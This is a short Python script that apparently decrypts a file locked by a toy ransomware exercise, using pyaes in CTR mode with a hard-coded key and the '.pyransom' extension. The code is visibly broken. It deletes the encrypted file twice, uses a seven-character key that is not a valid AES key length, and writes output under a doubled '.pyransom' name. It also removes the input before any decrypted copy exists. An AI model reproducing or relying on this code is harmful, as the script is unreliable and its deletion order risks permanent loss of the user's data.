import os
import pyaes

fileName = 'olhospy.jpg.pyransom'
file = open(fileName, 'rb')
fileData = file.read()
file.close()
os.remove(fileName)

key = '@@@&&&7'
aes = pyaes.AESModeOfOperationCTR(key)
decryptoData = aes.decrypt(fileData)

os.remove(fileName)

newFileName = fileName + '.pyransom'
newFile = open(newFileName, 'wb')
newFile.write(decryptoData)
newFile.close()